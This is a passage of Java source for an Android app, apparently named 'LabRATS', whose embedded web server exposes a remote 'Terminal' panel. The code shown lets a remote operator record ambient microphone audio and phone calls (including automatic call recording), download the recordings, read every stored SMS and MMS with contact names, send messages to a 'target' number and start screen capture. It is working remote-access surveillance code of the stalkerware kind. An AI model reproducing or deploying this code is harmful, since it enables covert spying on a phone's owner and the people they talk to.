        return serveSingleFrame(); // Fallback to black pixel
    }

    private Response startScreenProjection() {
        try {
            logActivity("PROJECTION_UPLINK: Screen share protocol initiated");
            Intent intent = new Intent(context, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("trigger", "screen_capture");
            context.startActivity(intent);
            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Consent prompt sent to device\"}");
        } catch (Exception e) {
            return serveError("Projection Error: " + e.getMessage());
        }
    }

    // ============ AUDIO/MICROPHONE RECORDING ============

    private Response serveAudioPage() {
        boolean isRecording = CallRecordService.isRecording();
        boolean isRecordingCall = CallRecordService.isRecordingCall();
        boolean isRecordingMic = CallRecordService.isRecordingMic();
        boolean callInProgress = CallRecordService.isCallInProgress();
        String callNumber = CallRecordService.getCurrentCallNumber();
        String callType = CallRecordService.getCurrentCallType();
        long duration = CallRecordService.getRecordingDuration();
        boolean autoRecordEnabled = CallRecordService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = CallRecordService.isSaveOnDeviceEnabled();

        String html = HTML_HEADER +
                "<style>" +
                ".status-card { padding: 20px; background: rgba(255,255,255,0.05); border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); }"
                +
                ".status-active { border-color: #2ecc71; background: rgba(46, 204, 113, 0.1); }" +
                ".status-inactive { border-color: #e74c3c; background: rgba(231, 76, 60, 0.1); }" +
                ".status-warning { border-color: #f39c12; background: rgba(243, 156, 18, 0.1); }" +
                ".btn { padding: 12px 24px; border-radius: 10px; text-decoration: none; display: inline-block; margin: 5px; font-weight: 600; cursor: pointer; border: none; font-size: 0.9rem; }"
                +
                ".btn-primary { background: linear-gradient(135deg, #e94560, #ff6b6b); color: white; }" +
                ".btn-success { background: linear-gradient(135deg, #2ecc71, #27ae60); color: white; }" +
                ".btn-danger { background: linear-gradient(135deg, #e74c3c, #c0392b); color: white; }" +
                ".btn-warning { background: linear-gradient(135deg, #f39c12, #e67e22); color: white; }" +
                ".toggle-container { display: flex; align-items: center; gap: 10px; margin: 10px 0; }" +
                ".toggle-switch { position: relative; width: 50px; height: 26px; background: #555; border-radius: 13px; cursor: pointer; transition: all 0.3s; }"
                +
                ".toggle-switch.active { background: #2ecc71; }" +
                ".toggle-switch::after { content: ''; position: absolute; width: 22px; height: 22px; border-radius: 50%; background: white; top: 2px; left: 2px; transition: all 0.3s; }"
                +
                ".toggle-switch.active::after { left: 26px; }" +
                ".call-alert { padding: 20px; background: linear-gradient(135deg, rgba(46, 204, 113, 0.3), rgba(39, 174, 96, 0.2)); border-radius: 15px; margin-bottom: 20px; border: 2px solid #2ecc71; animation: pulse 2s infinite; }"
                +
                "@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }" +
                ".recording-indicator { display: inline-flex; align-items: center; gap: 8px; padding: 8px 16px; background: rgba(231, 76, 60, 0.2); border-radius: 20px; color: #e74c3c; font-weight: 600; }"
                +
                ".recording-dot { width: 10px; height: 10px; background: #e74c3c; border-radius: 50%; animation: blink 1s infinite; }"
                +
                "@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }" +
                ".duration { font-size: 1.5rem; font-weight: bold; color: #00f2ff; }" +
                "</style>" +
                "<div class=\"back-btn-container\">" +
                "<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>" +
                "</div>" +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 20px;\">&#127908; Audio Control Panel</h2>";

        // Call in progress alert
        if (callInProgress) {
            html += "<div class=\"call-alert\">" +
                    "<div style=\"display: flex; align-items: center; gap: 15px;\">" +
                    "<span style=\"font-size: 2rem;\">&#128222;</span>" +
                    "<div>" +
                    "<div style=\"font-size: 1.2rem; font-weight: bold; color: #2ecc71;\">" +
                    (callType.equals("incoming") ? "Incoming Call" : "Outgoing Call") + "</div>" +
                    "<div style=\"color: #fff;\">" + escapeHtml(callNumber) + "</div>" +
                    "</div>" +
                    "</div>" +
                    "</div>";
        }

        // Recording status
        html += "<div class=\"status-card " + (isRecording ? "status-active" : "status-inactive") + "\">" +
                "<div style=\"display: flex; justify-content: space-between; align-items: center;\">" +
                "<div>" +
                "<h3>" + (isRecording ? "&#128308; Recording Active" : "&#9899; Not Recording") + "</h3>";

        if (isRecording) {
            String recordingType = isRecordingCall ? "Call Recording" : "Microphone Recording";
            html += "<p style=\"color: #888; margin-top: 5px;\">" + recordingType + "</p>" +
                    "<div class=\"duration\" id=\"duration\">" + formatDuration((int) duration) + "</div>";
        }

        html += "</div>" +
                "<div>" +
                (isRecording
                        ? "<a href=\"/audio/" + (isRecordingCall ? "call" : "mic")
                                + "/stop\" class=\"btn btn-danger\">&#9724; Stop</a>"
                        : "")
                +
                "</div>" +
                "</div>" +
                "</div>";

        // Control buttons
        html += "<div class=\"card\">" +
                "<h3 style=\"margin-bottom: 15px;\">&#127897; Microphone Recording</h3>" +
                "<p style=\"color: #888; margin-bottom: 15px;\">Capture ambient audio from device microphone</p>" +
                "<div>" +
                "<a href=\"/audio/mic/start\" class=\"btn btn-success\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">&#128308; Start Recording</a>" +
                "<a href=\"/audio/mic/start?duration=30\" class=\"btn btn-warning\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 30s</a>" +
                "<a href=\"/audio/mic/start?duration=60\" class=\"btn btn-warning\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 1min</a>" +
                "<a href=\"/audio/mic/start?duration=300\" class=\"btn btn-warning\" "
                + (isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "") + ">Record 5min</a>" +
                "</div>" +
                "</div>";

        // Call recording section
        html += "<div class=\"card\">" +
                "<h3 style=\"margin-bottom: 15px;\">&#128222; Call Recording</h3>" +
                "<p style=\"color: #888; margin-bottom: 15px;\">Record phone calls automatically or manually</p>" +
                "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;\">"
                +
                "<div class=\"toggle-container\">" +
                "<span>Auto-record calls:</span>" +
                "<a href=\"/audio/settings?auto_record=" + (!autoRecordEnabled) + "&save_on_device="
                + saveOnDeviceEnabled + "\" style=\"text-decoration: none;\">" +
                "<div class=\"toggle-switch " + (autoRecordEnabled ? "active" : "") + "\"></div>" +
                "</a>" +
                "</div>" +
                "<div class=\"toggle-container\">" +
                "<span>Save on device:</span>" +
                "<a href=\"/audio/settings?auto_record=" + autoRecordEnabled + "&save_on_device="
                + (!saveOnDeviceEnabled) + "\" style=\"text-decoration: none;\">" +
                "<div class=\"toggle-switch " + (saveOnDeviceEnabled ? "active" : "") + "\"></div>" +
                "</a>" +
                "</div>" +
                "</div>" +
                "</div>";

        // View recordings link
        html += "<div class=\"card\">" +
                "<h3 style=\"margin-bottom: 15px;\">&#128190; Saved Recordings</h3>" +
                "<a href=\"/audio/recordings\" class=\"btn btn-primary\">View All Recordings</a>" +
                "<a href=\"/files/Music/LabRATSRecordings\" class=\"btn btn-success\">Open in File Manager</a>" +
                "</div>";

        // Auto-refresh script for status
        html += "<script>" +
                "setInterval(function() {" +
                "  fetch('/audio/status')" +
                "    .then(r => r.json())" +
                "    .then(data => {" +
                "      if (data.isRecording && document.getElementById('duration')) {" +
                "        var d = data.duration;" +
                "        var min = Math.floor(d / 60);" +
                "        var sec = d % 60;" +
                "        document.getElementById('duration').textContent = min + ':' + (sec < 10 ? '0' : '') + sec;" +
                "      }" +
                "      if (data.callInProgress && !document.querySelector('.call-alert')) {" +
                "        location.reload();" +
                "      }" +
                "    });" +
                "}, 2000);" +
                "</script>";

        html += HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response startMicRecording(Map<String, String> params) {
        int duration = 0;
        if (params.containsKey("duration")) {
            try {
                duration = Integer.parseInt(params.get("duration"));
            } catch (Exception e) {
                duration = 0;
            }
        }

        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("START_MIC_RECORDING");
        intent.putExtra("duration", duration);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        // Redirect back to audio page
        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#127897; Starting microphone recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response stopMicRecording() {
        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("STOP_MIC_RECORDING");
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping microphone recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response startCallRecording(Map<String, String> params) {
        String phoneNumber = params.get("number");
        String callType = params.get("type");

        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("START_CALL_RECORDING");
        intent.putExtra("phone_number", phoneNumber != null ? phoneNumber : "manual");
        intent.putExtra("call_type", callType != null ? callType : "manual");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        String json = "{\"success\": true, \"message\": \"Call recording started\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopCallRecording() {
        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("STOP_CALL_RECORDING");
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping call recording...</h2></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAudioStatus() {
        boolean isRecording = CallRecordService.isRecording();
        boolean isRecordingCall = CallRecordService.isRecordingCall();
        boolean isRecordingMic = CallRecordService.isRecordingMic();
        boolean callInProgress = CallRecordService.isCallInProgress();
        String callNumber = CallRecordService.getCurrentCallNumber();
        String callType = CallRecordService.getCurrentCallType();
        long duration = CallRecordService.getRecordingDuration();
        String recordingPath = CallRecordService.getCurrentRecordingPath();
        boolean autoRecordEnabled = CallRecordService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = CallRecordService.isSaveOnDeviceEnabled();

        String json = String.format(
                "{\"isRecording\": %s, \"isRecordingCall\": %s, \"isRecordingMic\": %s, " +
                        "\"callInProgress\": %s, \"callNumber\": \"%s\", \"callType\": \"%s\", " +
                        "\"duration\": %d, \"recordingPath\": %s, " +
                        "\"autoRecordEnabled\": %s, \"saveOnDeviceEnabled\": %s}",
                isRecording, isRecordingCall, isRecordingMic,
                callInProgress, escapeHtml(callNumber != null ? callNumber : ""), callType != null ? callType : "",
                duration, recordingPath != null ? "\"" + recordingPath + "\"" : "null",
                autoRecordEnabled, saveOnDeviceEnabled);
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response updateAudioSettings(Map<String, String> params) {
        boolean autoRecord = "true".equalsIgnoreCase(params.get("auto_record"));
        boolean saveOnDevice = "true".equalsIgnoreCase(params.get("save_on_device"));

        android.content.Intent intent = new android.content.Intent(context, CallRecordService.class);
        intent.setAction("UPDATE_SETTINGS");
        intent.putExtra("auto_record", autoRecord);
        intent.putExtra("save_on_device", saveOnDevice);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        // Redirect back to audio page
        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/audio\"></head>" +
                "<body></body></html>";
        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveAudioRecordings() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128190; Audio Recordings</h2>");

        // Get recordings directory
        File recordDir = new File(Environment.getExternalStoragePublicDirectory(
                Environment.DIRECTORY_MUSIC), "LabRATSRecordings");

        if (!recordDir.exists() || !recordDir.isDirectory()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
        } else {
            File[] files = recordDir.listFiles(
                    (dir, name) -> name.toLowerCase().endsWith(".m4a") || name.toLowerCase().endsWith(".mp3") ||
                            name.toLowerCase().endsWith(".wav") || name.toLowerCase().endsWith(".aac"));

            if (files == null || files.length == 0) {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
            } else {
                // Sort by date (newest first)
                java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

                html.append("<ul class=\"file-list\">");

                int count = 0;
                for (File file : files) {
                    if (count >= 50)
                        break; // Limit to 50 files

                    String fileName = file.getName();
                    String icon = "&#127897;";
                    String iconClass = "file-icon-audio";

                    // Determine recording type from filename
                    String recordType = "Unknown";
                    if (fileName.startsWith("CALL_incoming")) {
                        icon = "&#128222;";
                        recordType = "Incoming Call";
                    } else if (fileName.startsWith("CALL_outgoing")) {
                        icon = "&#128222;";
                        recordType = "Outgoing Call";
                    } else if (fileName.startsWith("MIC_")) {
                        icon = "&#127897;";
                        recordType = "Microphone";
                    }

                    html.append("<li class=\"file-item\">");
                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon)
                            .append("</div>");
                    html.append("<div class=\"file-info\">");
                    html.append("<span class=\"file-name\">").append(escapeHtml(fileName)).append("</span>");
                    html.append("<div class=\"file-meta\">");
                    html.append(recordType).append(" - ");
                    html.append(formatFileSize(file.length())).append(" - ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
                            .format(new Date(file.lastModified())));
                    html.append("</div></div>");
                    html.append("<a href=\"/download/Music/LabRATSRecordings/").append(fileName)
                            .append("\" style=\"padding: 8px 16px; background: rgba(0, 242, 255, 0.1); border-radius: 8px; color: #00f2ff; text-decoration: none; font-size: 0.85rem;\">Download</a>");
                    html.append("</li>");

                    count++;
                }

                html.append("</ul>");
            }
        }

        html.append("<div style=\"margin-top: 20px;\">");
        html.append(
                "<a href=\"/audio\" style=\"color: #00f2ff; text-decoration: none;\">&larr; Back to Audio Control</a>");
        html.append("</div>");
        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveSmsMessages(Map<String, String> params) {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128233; SMS Terminal</h2>");
        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px;\">&#128231; Send New Message</h3>");
        html.append("<form action=\"/sms/send\" method=\"get\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px;\">");
        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 4px; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<textarea name=\"message\" placeholder=\"Message Content\" rows=\"3\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 4px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
        html.append("<button type=\"submit\" style=\"align-self: flex-start;\">ENCRYPT & SEND</button>");
        html.append("</div></form></div>");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>SMS permission not granted.</p></div></div>").append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }
        int page = 1; int limit = 50;
        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception e) {}
        int offset = (page - 1) * limit;
        Cursor cursor = null;
        try {
            Uri smsUri = Uri.parse("content://sms/");
            cursor = context.getContentResolver().query(smsUri, new String[]{"_id", "address", "body", "date", "type"}, null, null, "date DESC");
            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);
                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount).append(" messages | Page ").append(page).append(" of ").append(totalPages).append("</p>");
                html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Type</th><th>Address</th><th>Message</th><th>Date</th></tr></thead><tbody>");
                int count = 0, skipped = 0;
                Map<String, String> contactCache = new HashMap<>();
                while (cursor.moveToNext()) {
                    if (skipped < offset) { skipped++; continue; }
                    if (count >= limit) break;
                    String address = cursor.getString(1), body = cursor.getString(2);
                    long date = cursor.getLong(3); int type = cursor.getInt(4);
                    String typeLabel = (type == 1) ? "INBOX" : "SENT", typeClass = (type == 1) ? "call-incoming" : "call-outgoing";
                    String displayName = getContactName(address, contactCache);
                    html.append("<tr><td class=\"").append(typeClass).append("\">").append(typeLabel).append("</td>");
                    html.append("<td>").append(escapeHtml(displayName)).append("</td>");
                    html.append("<td style=\"max-width: 400px; word-wrap: break-word;\">").append(body != null ? escapeHtml(body) : "").append("</td>");
                    html.append("<td>").append(formatMessageDate(date)).append("</td></tr>");
                    count++;
                }
                html.append("</tbody></table></div>");
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
                    
                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/sms?page=1\">First</a>");
                        html.append("<a href=\"/sms?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);
                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/sms?page=").append(i).append("\">").append(i).append("</a>");
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/sms?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/sms?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/sms\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 4px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128233;</div><p>No messages found</p></div>"); }
        } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
        finally { if (cursor != null) cursor.close(); }
        html.append("</div>").append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveMmsMessages(Map<String, String> params) {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; MMS Terminal</h2>");
        
        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px;\">&#128247; Send New Multimedia Message</h3>");
        html.append("<form action=\"/mms/send\" method=\"post\" enctype=\"multipart/form-data\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px;\">");
        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 4px; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<textarea name=\"message\" placeholder=\"Message Content (Optional)\" rows=\"2\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 4px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
        html.append("<div style=\"display: flex; align-items: center; gap: 10px;\">");
        html.append("<span style=\"color: #888; font-size: 0.8rem;\">Attach Media:</span>");
        html.append("<input type=\"file\" name=\"media\" accept=\"image/*,video/*,audio/*\" style=\"color: #888; font-size: 0.8rem;\">");
        html.append("</div>");
        html.append("<button type=\"submit\" style=\"align-self: flex-start;\">UPLOAD & DISPATCH</button>");
        html.append("</div></form></div>");

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>MMS permission not granted.</p></div></div>").append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }
        int page = 1; int limit = 20;
        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception e) {}
        int offset = (page - 1) * limit;
        Cursor cursor = null;
        try {
            Set<String> mmsWithImages = getMmsIdsWithImages();
            Uri mmsUri = Uri.parse("content://mms/");
            cursor = context.getContentResolver().query(mmsUri, new String[]{"_id", "date", "msg_box"}, null, null, "date DESC");
            if (cursor != null && cursor.getCount() > 0) {
                List<String[]> mmsList = new ArrayList<>();
                while (cursor.moveToNext()) {
                    String mmsId = cursor.getString(0);
                    if (mmsWithImages.contains(mmsId)) {
                        mmsList.add(new String[]{
                            mmsId, 
                            String.valueOf(cursor.getLong(1) * 1000), 
                            String.valueOf(cursor.getInt(2))
                        });
                    }
                }

                int totalCount = mmsList.size();
                int totalPages = (int) Math.ceil((double) totalCount / limit);
                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount).append(" Media Messages | Page ").append(page).append(" of ").append(totalPages).append("</p>");
                html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Type</th><th>Contact</th><th>Content</th><th>Date</th></tr></thead><tbody>");
                
                Map<String, String> contactCache = new HashMap<>();
                for (int i = offset; i < Math.min(offset + limit, totalCount); i++) {
                    String[] mData = mmsList.get(i);
                    String mmsId = mData[0]; long date = Long.parseLong(mData[1]);
                    int msgBox = Integer.parseInt(mData[2]);
                    String typeLabel = (msgBox == 1) ? "INBOX" : "SENT", typeClass = (msgBox == 1) ? "call-incoming" : "call-outgoing";
                    String address = getMmsAddress(mmsId); List<String> parts = getMmsParts(mmsId);
                    String displayName = getContactName(address, contactCache);
                    html.append("<tr><td class=\"").append(typeClass).append("\">").append(typeLabel).append("</td>");
                    html.append("<td>").append(escapeHtml(displayName)).append("</td><td style=\"max-width: 400px;\">");
                    for (String part : parts) {
                        if (part.startsWith("text:")) html.append("<div style=\"margin-bottom:5px;\">").append(escapeHtml(part.substring(5))).append("</div>");
                        else if (part.startsWith("image:")) {
                            html.append("<img src=\"/mms/image/").append(part.substring(6))
                                .append("\" style=\"max-width: 150px; border: 1px solid var(--neon-cyan); margin-top:5px; border-radius:4px; cursor:zoom-in;\" onclick=\"window.open(this.src)\">");
                        }
                    }
                    html.append("</td><td>").append(formatMessageDate(date)).append("</td></tr>");
                }
                html.append("</tbody></table></div>");
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
                    
                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/mms?page=1\">First</a>");
                        html.append("<a href=\"/mms?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }
                    for (int i = Math.max(1, page-2); i <= Math.min(totalPages, page+2); i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/mms?page=").append(i).append("\">").append(i).append("</a>");
                    }
                    if (page < totalPages) {
                        html.append("<a href=\"/mms?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/mms?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/mms\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 4px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div><p>No MMS found</p></div>"); }
        } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
        finally { if (cursor != null) cursor.close(); }
        html.append("</div>").append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private String getMmsAddress(String mmsId) {
        Uri addrUri = Uri.parse("content://mms/" + mmsId + "/addr");
        Cursor c = context.getContentResolver().query(addrUri, null, "msg_id=" + mmsId, null, null);
        String address = "Unknown";
        if (c != null) {
            int addrIdx = c.getColumnIndex("address");
            while (c.moveToNext()) {
                if (addrIdx != -1) {
                    String addr = c.getString(addrIdx);
                    if (addr != null && !addr.equals("insert-address-token")) {
                        address = addr;
                        break;
                    }
                }
            }
            c.close();
        }
        return address;
    }

    private List<String> getMmsParts(String mmsId) {
        List<String> parts = new ArrayList<>();
        Uri partUri = Uri.parse("content://mms/part");
        Cursor c = context.getContentResolver().query(partUri, null, "mid=" + mmsId, null, null);
        if (c != null) {
            int idIdx = c.getColumnIndex("_id");
            int ctIdx = c.getColumnIndex("ct");
            int textIdx = c.getColumnIndex("text");
            while (c.moveToNext()) {
                if (idIdx == -1 || ctIdx == -1) continue;
                String partId = c.getString(idIdx);
                String type = c.getString(ctIdx);
                if ("text/plain".equals(type)) {
                    String body = textIdx != -1 ? c.getString(textIdx) : null;
                    if (body == null && partId != null) body = getMmsText(partId);
                    if (body != null) parts.add("text:" + body);
                } else if (type != null && type.startsWith("image/") && partId != null) {
                    parts.add("image:" + partId);
                }
            }
            c.close();
        }
        return parts;
    }

    private Set<String> getMmsIdsWithImages() {
        Set<String> ids = new HashSet<>();
        try {
            Uri partUri = Uri.parse("content://mms/part");
            Cursor c = context.getContentResolver().query(partUri, new String[]{"mid"}, "ct LIKE 'image/%'", null, null);
            if (c != null) {
                int midIdx = c.getColumnIndex("mid");
                while (c.moveToNext()) {
                    if (midIdx != -1) {
                        String mid = c.getString(midIdx);
                        if (mid != null) ids.add(mid);
                    }
                }
                c.close();
            }
        } catch (Exception e) {}
        return ids;
    }

    private String getContactName(String number, Map<String, String> cache) {
        if (number == null || number.isEmpty() || number.equals("Unknown") || number.equals("insert-address-token")) {
            return number == null ? "Unknown" : number;
        }

        if (cache != null && cache.containsKey(number)) {
            return cache.get(number);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                return number;
            }
        }

        String result = number;
        Cursor cursor = null;
        try {
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
            cursor = context.getContentResolver().query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                String name = cursor.getString(0);
                if (name != null && !name.isEmpty()) {
                    result = name;
                }
            }
        } catch (Exception e) {
        } finally {
            if (cursor != null) cursor.close();
        }

        if (cache != null) {
            cache.put(number, result);
        }
        return result;
    }

    private String formatMessageDate(long timestamp) {
        return new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(timestamp));
    }

    private String getMmsText(String partId) {
        Uri partUri = Uri.parse("content://mms/part/" + partId);
        StringBuilder sb = new StringBuilder();
        try {
            InputStream is = context.getContentResolver().openInputStream(partUri);
            if (is != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                is.close();
            }
